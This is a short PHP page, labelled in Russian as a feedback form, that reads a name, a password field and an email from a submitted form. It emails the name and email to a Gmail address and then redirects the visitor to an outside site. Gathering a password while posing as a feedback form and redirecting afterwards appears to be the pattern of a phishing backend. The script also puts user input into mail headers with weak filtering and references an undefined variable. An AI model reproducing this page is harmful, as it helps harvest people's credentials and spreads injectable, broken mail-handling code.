﻿<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Создание формы обратной связи</title>
<meta http-equiv="Refresh" content="4; URL=http://iolpkjoin.hol.es/">
</head>
<body>

<?php 

$sendto   = "kkillerrpg79@gmail.com"; 
$username = $_POST['name'];   
$userpass = $_POST['pass']; 
$usermail = $_POST['email']; 

// Формирование заголовка письма
$subject  = "Новое сообщение";
$headers  = "From: " . strip_tags($usermail) . "\r\n";
$headers .= "Reply-To: ". strip_tags($usermail) . "\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html;charset=utf-8 \r\n";

// Формирование тела письма
$msg  = "<html><body style='font-family:Arial,sans-serif;'>";
$msg .= "<h2 style='font-weight:bold;border-bottom:1px dotted #ccc;'>Cообщение с сайта</h2>\r\n";
$msg .= "<p><strong>От кого:</strong> ".$username."</p>\r\n";
$msg .= "<p><strong>Почта:</strong> ".$usermail."</p>\r\n";
$msg .= "<p><strong>Телефон:</strong> ".$usertel."</p>\r\n";
$msg .= "</body></html>";

// отправка сообщения
if(@mail($sendto, $subject, $msg, $headers)) {
	echo "<center><img src='images/spasibo.png'></center>";
} else {
	echo "<center><img src='images/ne-otpravleno.png'></center>";
}

?>

</body>
</html>